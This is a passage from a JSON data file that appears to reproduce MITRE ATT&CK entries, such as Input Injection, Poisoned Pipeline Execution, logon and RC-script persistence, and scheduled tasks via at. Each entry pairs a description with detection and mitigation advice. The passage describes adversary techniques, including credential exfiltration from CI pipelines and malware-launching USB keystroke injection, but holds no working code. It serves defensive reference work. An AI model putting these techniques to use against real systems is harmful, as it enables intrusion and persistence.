Manager Run Command)</a> <a href=\"https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Run Command)</a>\n\nIf an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a Trusted Relationship to execute commands in connected virtual machines. <a href=\"https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSTIC Nobelium Oct 2021)</a>","detection":"","platforms":["IaaS"],"dataSources":["Command: Command Execution","Process: Process Creation","Script: Script Execution"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit the number of cloud accounts with permissions to remotely execute commands on virtual machines, and ensure that these are not used for day-to-day operations. In Azure, limit the number of accounts with the roles Azure Virtual Machine Contributer and above, and consider using temporary Just-in-Time (JIT) roles to avoid permanently assigning privileged access to virtual machines. <a href=\"https://www.mandiant.com/resources/blog/azure-run-command-dummies\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Azure Run Command 2021)</a>"}],"subTechniques":[]},{"id":"T1674","name":"Input Injection","description":"Adversaries may simulate keystrokes on a victim’s computer by various means to perform any type of action on behalf of the user, such as launching the command interpreter using keyboard shortcuts,  typing an inline script to be executed, or interacting directly with a GUI-based application.  These actions can be preprogrammed into adversary tooling or executed through physical devices such as Human Interface Devices (HIDs).\n\nFor example, adversaries have used tooling that monitors the Windows message loop to detect when a user visits bank-specific URLs. If detected, the tool then simulates keystrokes to open the developer console or select the address bar, pastes malicious JavaScript from the clipboard, and executes it - enabling manipulation of content within the browser, such as replacing bank account numbers during transactions. <a href=\"https://www.bleepingcomputer.com/news/security/backswap-banking-trojan-uses-never-before-seen-techniques/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BleepingComputer BackSwap)</a> <a href=\"https://www.welivesecurity.com/2018/05/25/backswap-malware-empty-bank-accounts/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: welivesecurity BackSwap)</a>\n\nAdversaries have also used malicious USB devices to emulate keystrokes that launch PowerShell, leading to the download and execution of malware from adversary-controlled servers. <a href=\"https://www.bleepingcomputer.com/news/security/fbi-hackers-sending-malicious-usb-drives-and-teddy-bears-via-usps/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BleepingComputer USB)</a>","detection":"","platforms":["Windows","macOS","Linux"],"dataSources":[],"mitigations":[{"id":"M1034","name":"Limit Hardware Installation","description":"Limit the use of USB devices and removable media within a network."},{"id":"M1038","name":"Execution Prevention","description":"Denylist scripting and use application control where appropriate. For example, PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files (e.g., <code>Add-Type</code>). <a href=\"https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PowerShell CLM)</a>"}],"subTechniques":[]},{"id":"T1675","name":"ESXi Administration Command","description":"Adversaries may abuse ESXi administration services to execute commands on guest machines hosted within an ESXi virtual environment. Persistent background services on ESXi-hosted VMs, such as the VMware Tools Daemon Service, allow for remote management from the ESXi server. The tools daemon service runs as <code>vmtoolsd.exe</code> on Windows guest operating systems, <code>vmware-tools-daemon</code> on macOS, and <code>vmtoolsd </code> on Linux. <a href=\"https://techdocs.broadcom.com/us/en/vmware-cis/vsphere/tools/12-4-0/vmware-tools-administration-12-4-0/introduction-to-vmware-tools/vmware-tools-service.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom VMware Tools Services)</a> \n\nAdversaries may leverage a variety of tools to execute commands on ESXi-hosted VMs – for example, by using the vSphere Web Services SDK to programmatically execute commands and scripts via APIs such as <code>StartProgramInGuest</code>, <code>ListProcessesInGuest</code>,  <code>ListFileInGuest</code>, and <code>InitiateFileTransferFromGuest</code>. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)</a> <a href=\"https://techdocs.broadcom.com/us/en/vmware-cis/vsphere/vsphere-sdks-tools/8-0/web-services-sdk-programming-guide/virtual-machine-guest-operations/running-guest-os-operations.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom Running Guest OS Operations)</a> This may enable follow-on behaviors on the guest VMs, such as File and Directory Discovery, Data from Local System, or OS Credential Dumping.","detection":"","platforms":["ESXi"],"dataSources":[],"mitigations":[{"id":"M1018","name":"User Account Management","description":"If not required, restrict the permissions of users to perform Guest Operations on ESXi-hosted VMs. <a href=\"https://techdocs.broadcom.com/us/en/vmware-cis/vsphere/vsphere/7-0/vsphere-security-7-0/defined-privileges/virtual-machine-guest-operations-privileges.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom Virtual Machine Guest Operations Privileges)</a>"}],"subTechniques":[]},{"id":"T1677","name":"Poisoned Pipeline Execution","description":"Adversaries may manipulate continuous integration / continuous development (CI/CD) processes by injecting malicious code into the build process. There are several mechanisms for poisoning pipelines: \n\n* In a &lt;b&gt;Direct Pipeline Execution&lt;/b&gt; scenario, the threat actor directly modifies the CI configuration file (e.g., <code>gitlab-ci.yml</code> in GitLab). They may include a command to exfiltrate credentials leveraged in the build process to a remote server, or to export them as a workflow artifact. <a href=\"https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Palo Alto GitHub Actions Supply Chain Attack 2025)</a> <a href=\"https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OWASP CICD-SEC-4)</a>\n* In an &lt;b&gt;Indirect Pipeline Execution&lt;/b&gt; scenario, the threat actor injects malicious code into files referenced by the CI configuration file. These may include makefiles, scripts, unit tests, and linters. <a href=\"https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OWASP CICD-SEC-4)</a>\n* In a &lt;b&gt;Public Pipeline Execution&lt;/b&gt; scenario, the threat actor does not have direct access to the repository but instead creates a malicious pull request from a fork that triggers a part of the CI/CD pipeline. For example, in GitHub Actions, the <code>pull_request_target</code> trigger allows workflows running from forked repositories to access secrets.  If this trigger is combined with an explicit pull request checkout and a location for a threat actor to insert malicious code (e.g., an <code>npm build</code> command), a threat actor may be able to leak pipeline credentials. <a href=\"https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Palo Alto GitHub Actions Supply Chain Attack 2025)</a> <a href=\"https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Security Lab GitHub Actions Security 2021)</a> Similarly, threat actors may craft pull requests with malicious inputs (such as branch names) if the build pipeline treats those inputs as trusted. <a href=\"https://www.wiz.io/blog/ultralytics-ai-library-hacked-via-github-for-cryptomining\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wiz Ultralytics AI Library Hijack 2024)</a> <a href=\"https://www.synacktiv.com/en/publications/hijacking-github-runners-to-compromise-the-organization\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Synactiv Hijacking GitHub Runners)</a> <a href=\"https://securitylab.github.com/resources/github-actions-untrusted-input/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Security Labs GitHub Actions Security Part 2 2021)</a> Finally, if a pipeline leverages a self-hosted runner, a threat actor may be able to execute arbitrary code on a host inside the organization’s network. <a href=\"https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: John Stawinski PyTorch Supply Chain Attack 2024)</a>\n\nBy poisoning CI/CD pipelines, threat actors may be able to gain access to credentials, laterally move to additional hosts, or input malicious components to be shipped further down the pipeline (i.e., Supply Chain Compromise).","detection":"","platforms":["SaaS"],"dataSources":[],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that CI/CD pipelines only have permissions they require to complete their operations. Additionally, limit the number of users who have write access to internal repositories to only those necessary."},{"id":"M1054","name":"Software Configuration","description":"Where possible, avoid allowing pipelines to run unreviewed code. Where this is necessary, ensure that these pipelines are executed on isolated nodes without access to secrets. In GitHub, avoid using the <code>pull_request_target</code> trigger if possible, do not treat user-controlled inputs (such as branch names) as trusted, and do not use self-hosted runners on public repositories."}],"subTechniques":[]}]},{"tactic":"Persistence","techniques":[{"id":"T1037","name":"Boot or Logon Initialization Scripts","description":"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. <a href=\"https://www.mandiant.com/resources/blog/unc3524-eye-spy-email\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT29 Eye Spy Email Nov 22)</a> <a href=\"https://www.anomali.com/blog/rocke-evolves-its-arsenal-with-a-new-malware-family-written-in-golang\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Anomali Rocke March 2019)</a> Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.","detection":"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["File: File Modification","Windows Registry: Windows Registry Key Creation","Command: Command Execution","File: File Creation","Process: Process Creation","Active Directory: Active Directory Object Modification"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict write access to logon scripts to specific administrators."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys for logon scripts that may lead to persistence."}],"subTechniques":[{"id":"T1037.001","name":"Logon Script (Windows)","description":"Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence. Windows allows logon scripts to be run whenever a specific user or group of users log into a system. <a href=\"https://technet.microsoft.com/en-us/library/cc758918(v=ws.10).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Logon Scripts)</a> This is done via adding a path to a script to the <code>HKCU\\Environment\\UserInitMprLogonScript</code> Registry key. <a href=\"http://www.hexacorn.com/blog/2014/11/14/beyond-good-ol-run-key-part-18/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hexacorn Logon Scripts)</a>\n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.","detection":"Monitor for changes to Registry values associated with Windows logon scrips, nameley <code>HKCU\\Environment\\UserInitMprLogonScript</code>.\n\nMonitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":["Windows"],"dataSources":["Command: Command Execution","Process: Process Creation","Windows Registry: Windows Registry Key Creation"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper permissions are set for Registry hives to prevent users from modifying keys for logon scripts that may lead to persistence."}]},{"id":"T1037.002","name":"Login Hook","description":"Adversaries may use a Login Hook to establish persistence executed upon user logon. A login hook is a plist file that points to a specific script to execute with root privileges upon user logon. The plist file is located in the <code>/Library/Preferences/com.apple.loginwindow.plist</code> file and can be modified using the <code>defaults</code> command-line utility. This behavior is the same for logout hooks where a script can be executed upon user logout. All hooks require administrator permissions to modify or create hooks. <a href=\"https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CustomLogin.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Login Scripts Apple Dev)</a> <a href=\"https://developer.apple.com/documentation/devicemanagement/loginwindowscripts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: LoginWindowScripts Apple Dev)</a> \n\nAdversaries can add or insert a path to a malicious script in the <code>com.apple.loginwindow.plist</code> file, using the <code>LoginHook</code> or <code>LogoutHook</code> key-value pair. The malicious script is executed upon the next user login. If a login hook already exists, adversaries can add additional commands to an existing login hook. There can be only one login and logout hook on a system at a time. <a href=\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: S1 macOs Persistence)</a> <a href=\"https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wardle Persistence Chapter)</a>\n\n<strong>Note:</strong> Login hooks were deprecated in 10.11 version of macOS in favor of Launch Daemon and Launch Agent","detection":"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":["macOS"],"dataSources":["File: File Creation","File: File Modification","Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict write access to logon scripts to specific administrators."}]},{"id":"T1037.003","name":"Network Logon Script","description":"Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects. <a href=\"https://www.petri.com/setting-up-logon-script-through-active-directory-users-computers-windows-server-2008\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Petri Logon Script AD)</a> These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.  \n \nAdversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.","detection":"Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties. Monitor running process for actions that could be indicative of abnormal programs or executables running upon logon.","platforms":["Windows"],"dataSources":["Command: Command Execution","Active Directory: Active Directory Object Modification","File: File Modification","Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict write access to logon scripts to specific administrators."}]},{"id":"T1037.004","name":"RC Scripts","description":"Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like system’s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries may establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution. <a href=\"https://iranthreats.github.io/resources/attribution-flying-rocket-kitten/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: IranThreats Kittens Dec 2017)</a> <a href=\"https://www.intezer.com/blog-hiddenwasp-malware-targeting-linux-systems/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer HiddenWasp Map 2019)</a> Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as ESXi hypervisors, IoT, or embedded systems. <a href=\"https://www.intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: intezer-kaiji-malware)</a> As ESXi servers store most system files in memory and therefore discard changes on shutdown, leveraging <code>/etc/rc.local.d/local.sh</code> is one of the few mechanisms for enabling persistence across reboots. <a href=\"https://blogs.juniper.net/en-us/threat-research/a-custom-python-backdoor-for-vmware-esxi-servers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Juniper Networks ESXi Backdoor 2022)</a>\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of Launchd. <a href=\"https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Developer Doco Archive Launchd)</a> <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Startup Items)</a> This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts. <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Methods of Mac Malware Persistence)</a> To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions. <a href=\"http://manpages.ubuntu.com/manpages/bionic/man8/systemd-rc-local-generator.8.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ubuntu Manpage systemd rc)</a>","detection":"Monitor for unexpected changes to RC scripts in the <code>/etc/</code> directory. Monitor process execution resulting from RC scripts for unusual or unknown applications or behavior.\n\nMonitor for <code>/etc/rc.local</code> file creation. Although types of RC scripts vary for each Unix-like distribution, several execute <code>/etc/rc.local</code> if present.","platforms":["macOS","Linux","Network Devices","ESXi"],"dataSources":["File: File Creation","Process: Process Creation","File: File Modification","Command: Command Execution"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Limit privileges of user accounts so only authorized users can edit the <code>rc.common</code> file."}]},{"id":"T1037.005","name":"Startup Items","description":"Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items. <a href=\"https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Startup Items)</a>\n\nThis is technically a deprecated technology (superseded by Launch Daemon), and thus the appropriate folder, <code>/Library/StartupItems</code> isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism. <a href=\"https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Methods of Mac Malware Persistence)</a> Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.","detection":"The <code>/Library/StartupItems</code> folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist.\n\nMonitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.","platforms":["macOS"],"dataSources":["Command: Command Execution","File: File Creation","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Since StartupItems are deprecated, preventing all users from writing to the <code>/Library/StartupItems</code> directory would prevent any startup items from getting registered."}]}]},{"id":"T1053","name":"Scheduled Task/Job","description":"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system. <a href=\"https://technet.microsoft.com/en-us/library/cc785125.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Task Scheduler Security)</a>\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ProofPoint Serpent)</a>","detection":"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Containers","ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Scheduled Job: Scheduled Job Creation","File: File Creation","Process: Process Creation","Container: Container Creation","Command: Command Execution","File: File Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict access by setting directory and file permissions that are not specific to users or privileged accounts."},{"id":"M1026","name":"Privileged Account Management","description":"Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Increase scheduling priority. <a href=\"https://technet.microsoft.com/library/dn221960.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduling Priority)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. <a href=\"https://technet.microsoft.com/library/jj852168.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Server Operator Scheduled Task)</a>"},{"id":"M1047","name":"Audit","description":"Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>"}],"subTechniques":[{"id":"T1053.002","name":"At","description":"Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code. The at utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of Scheduled Task's schtasks in Windows environments, using at requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the <code>at</code> command, adversaries may also schedule a task with at by directly leveraging the Windows Management Instrumentation <code>Win32_ScheduledJob</code> WMI class. <a href=\"https://www.cybereason.com/blog/wmi-lateral-movement-win32#blog-subscribe\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malicious Life by Cybereason)</a>\n\nOn Linux and macOS, at may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke at. If the <code>at.deny</code> exists and is empty, global use of at is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use at. <a href=\"https://man7.org/linux/man-pages/man1/at.1p.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux at)</a>\n\nAdversaries may use at to execute programs at system startup or on a scheduled basis for Persistence. at can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse at to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, at may also be used for Privilege Escalation if the binary is allowed to run as superuser via <code>sudo</code>. <a href=\"https://gtfobins.github.io/gtfobins/at/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GTFObins at)</a>","detection":"Monitor process execution from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows. <a href=\"https://x.com/leoloobeek/status/939248813465853953\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter Leoloobeek Scheduled Task)</a> If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. <a href=\"https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Forum Scheduled Task Operational Setting)</a> Several events will then be logged on scheduled task activity, including: <a href=\"https://technet.microsoft.com/library/dd315590.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduled Task Events)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Scheduled Task Events Win10)</a>\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.\n\nIn Linux and macOS environments, monitor scheduled task creation using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc. \n\nReview all jobs using the <code>atq</code> command and ensure IP addresses stored in the <code>SSH_CONNECTION</code> and <code>SSH_CLIENT</code> variables, machines that created the jobs, are trusted hosts. All at jobs are stored in <code>/var/spool/cron/atjobs/</code>. <a href=\"https://www.linkedin.com/pulse/getting-attacker-ip-address-from-malicious-linux-job-craig-rowland/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: rowland linux at 2019)</a>\n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Windows","Linux","macOS"],"dataSources":["Command: Command Execution","Scheduled Job: Scheduled Job Creation","Network Traffic: Network Traffic Flow","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. In Linux environments, users account-level access to <code>at</code> can be managed using <code>at.allow</code> and <code>at.deny</code> files. Users listed in the at.allow are enabled to schedule actions using at, whereas users listed in at.deny file disabled from the utility."},{"id":"M1026","name":"Privileged Account Management","description":"Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Increase scheduling priority. <a href=\"https://technet.microsoft.com/library/dn221960.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduling Priority)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. <a href=\"https://technet.microsoft.com/library/jj852168.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Server Operator Scheduled Task)</a>"},{"id":"M1047","name":"Audit","description":"Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a> Windows operating system also creates a registry key specifically associated with the creation of a scheduled task on the destination host at: Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\At1. <a href=\"https://www.secureworks.com/blog/where-you-at-indicators-of-lateral-movement-using-at-exe-on-windows-7-systems\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Secureworks - AT.exe Scheduled Task)</a> In Linux and macOS environments, scheduled tasks using <code>at</code> can be audited locally, or through centrally collected logging, using syslog, or auditd events from the host. <a href=\"https://kifarunix.com/scheduling-tasks-using-at-command-in-linux/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kifarunix - Task Scheduling in Linux)</a>"}]},{"id":"T1053.003","name":"Cron","description":"Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code. <a 